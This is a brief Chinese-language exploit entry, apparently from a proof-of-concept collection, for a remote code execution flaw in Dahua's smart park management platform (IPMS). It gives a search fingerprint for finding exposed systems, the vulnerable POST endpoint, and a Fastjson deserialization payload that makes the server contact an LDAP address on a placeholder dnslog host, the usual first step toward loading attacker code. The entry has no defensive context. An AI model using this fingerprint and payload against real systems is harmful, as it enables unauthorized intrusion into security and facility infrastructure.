# 大华智慧园区综合管理平台ipms存在远程代码执行漏洞

大华 ｜ 命令执行 ｜ —
- **指纹**：`app="dahua-智慧园区综合管理平台"`
- **请求**：`POST /ipms/barpay/pay HTTP/1.1`

**Payload**
```
{"@type": "com.sun.rowset.JdbcRowSetImpl", "dataSourceName": "ldap://xxx.dnslog.com", "autoCommit": true}
```